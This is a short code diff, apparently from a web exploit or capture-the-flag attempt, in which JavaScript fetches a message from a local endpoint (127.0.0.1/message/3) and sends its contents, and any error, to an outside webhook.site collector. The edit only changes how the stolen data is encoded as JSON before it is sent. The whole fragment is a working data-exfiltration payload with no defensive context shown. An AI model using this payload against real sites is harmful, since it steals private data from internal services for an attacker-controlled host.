@@ -19,7 +19,7 @@ fetch('http://127.0.0.1/message/3')
     return response.json();
   })
   .then(data => {
-    fetch('https://webhook.site/a1f16161-b2ac-4a4f-81e4-836b24ec7b16/'+encodeURIComponent(data));
+    fetch('https://webhook.site/a1f16161-b2ac-4a4f-81e4-836b24ec7b16/'+encodeURIComponent(JSON.stringify(data)));
   })
   .catch(error => {
     fetch('https://webhook.site/a1f16161-b2ac-4a4f-81e4-836b24ec7b16/'+encodeURIComponent(error));
